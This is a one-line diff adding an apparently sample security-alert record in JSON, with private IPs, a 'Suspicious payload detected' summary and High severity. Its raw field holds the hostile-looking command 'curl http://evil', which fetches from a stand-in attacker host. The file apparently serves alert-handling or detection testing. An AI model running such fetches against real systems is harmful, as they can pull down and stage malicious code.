@@ -1,0 +1,1 @@
+{"ts":"2025-10-05T12:00:00Z","alert":{"source_ip":"192.168.1.10","destination_ip":"10.0.0.2","summary":"Suspicious payload detected","severity":"High","raw":"curl http://evil"}}
